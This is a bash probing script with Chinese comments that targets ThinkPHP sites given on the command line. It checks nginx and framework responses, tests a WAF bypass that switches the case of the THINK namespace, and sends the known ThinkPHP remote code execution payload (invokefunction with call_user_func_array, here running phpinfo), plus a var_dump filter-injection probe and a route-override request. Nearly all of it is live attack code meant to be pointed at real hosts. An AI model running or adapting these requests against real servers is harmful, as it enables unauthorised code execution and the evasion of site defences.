#!/bin/bash
# ThinkPHP 站点判定：WAF 在拦 vs 框架关掉了控制器调度；并验证 s= 路由覆盖
# 用法: ./tp-probe.sh HOST
# ---- 参数检查 ----
if [ $# -lt 1 ]; then printf '用法: ./tp-probe.sh <HOST>\n' >&2; exit 1; fi
H=$1; T=1792919097765268
HDR=(-H 'device: h5' -H 'token: x' -H "timestamp: $T" -H 'customerUID: 0' -H 'Accept: application/json, text/plain, */*')

echo '--- 1. 字面 index.php 是否被 nginx internal 掉'
curl -sk -o /dev/null -w '%{http_code} %{size_download}\n' "https://$H/index.php"
echo '--- 2. 任意路径是否进框架（TP 异常页约 6427B）'
curl -sk -o /dev/null -w '%{http_code} %{size_download}\n' "https://$H/zzz"
echo '--- 3. WAF 大小写敏感性（403=被 WAF 拦；404=放行）'
for s in 'index/%5Cthink%5CRequest/input' 'index/%5CTHINK%5CRequest/input'; do
  printf '%-42s ' "$s"; curl -sk -o /dev/null -w '%{http_code}\n' "https://$H/zzz?s=$s&filter=var_dump&data=deadbeef"
done
echo '--- 4. url_route_must：放行后仍 route-not-found = 控制器调度被关'
curl -sk "https://$H/zzz?s=index/%5CTHINK%5Capp/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=1" | head -c 200; echo
echo '--- 5. s= 路由覆盖：把已知注册路由塞进 s'
curl -sk "${HDR[@]}" "https://$H/zzz?s=/api/v1/common/banner/list" | head -c 200; echo
